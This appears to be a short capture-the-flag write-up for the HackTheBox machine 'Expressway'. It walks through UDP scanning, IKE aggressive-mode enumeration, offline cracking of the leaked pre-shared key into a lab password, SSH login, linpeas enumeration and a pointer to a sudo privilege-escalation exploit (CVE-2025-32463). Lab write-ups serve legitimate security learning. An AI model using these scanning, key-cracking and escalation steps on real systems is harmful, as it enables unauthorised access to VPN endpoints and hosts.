first, we start by a nmap scan, but tcp show nothing

then, we try a udp scan

nmap -sU --top-ports 100 -v -oN 06h25_[2025-09-24]_expressway.htb_nmap.txt expressway.htb
Discovered open port 500/udp on 10.129.246.130

PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
138/udp   open|filtered netbios-dgm
177/udp   open|filtered xdmcp
443/udp   open|filtered https
500/udp   open          isakmp
998/udp   open|filtered puparp
1029/udp  open|filtered solid-mux
2048/udp  open|filtered dls-monitor
2049/udp  open|filtered nfs
4500/udp  open|filtered nat-t-ike
5632/udp  open|filtered pcanywherestat
32769/udp open|filtered filenet-rpc
49152/udp open|filtered unknown
49154/udp open|filtered unknown
49185/udp open|filtered unknown


port isakmp on port 500 mean there might be a vpn service, we can try ike-scan to test it

ike-scan -A expressway.htb
10.129.246.130  Aggressive Mode Handshake returned HDR=(CKY-R=9805bdde1e964264) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

it gives us a username (ike@expressway.htb) and a pre-shared key (PSK) for offline cracking

whe can then try to crack the key using psk-crack

psk-crack -d rockyou.txt psk.txt
key "freakingrockstarontheroad" matches SHA1 hash 3b2ca2616d762e105a07eb2bf02768dc6358b97d

we find a match: freakingrockstarontheroad

when can then try to connect using ssh: ssh ike@expressway.htb.
once we are in we can get the user flag.

after that, we can try running linpeas.

we find a tftp service running (we also saw it earlier on port 69 with nmap)
root        3817  0.0  0.0   2900   640 ?        Ss   10:57   0:00 /usr/sbin/in.tftpd --listen --user tftp --address :69 --secure /srv/tftp

if we display the files inside /srv/tftp, we find a ciscortr.cfg

we also find that ike is in the proxy group.
User & Groups: uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)

finally, we find a custom sudo binary:
-rwsr-xr-x 1 root root 1023K Aug 29 15:18 /usr/local/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable

by looking at the sudo version, we find the version
sudo -V

after a quick search, we find the CVE-2025-32463 that we can exploit
https://github.com/kh4sh3i/CVE-2025-32463/tree/main
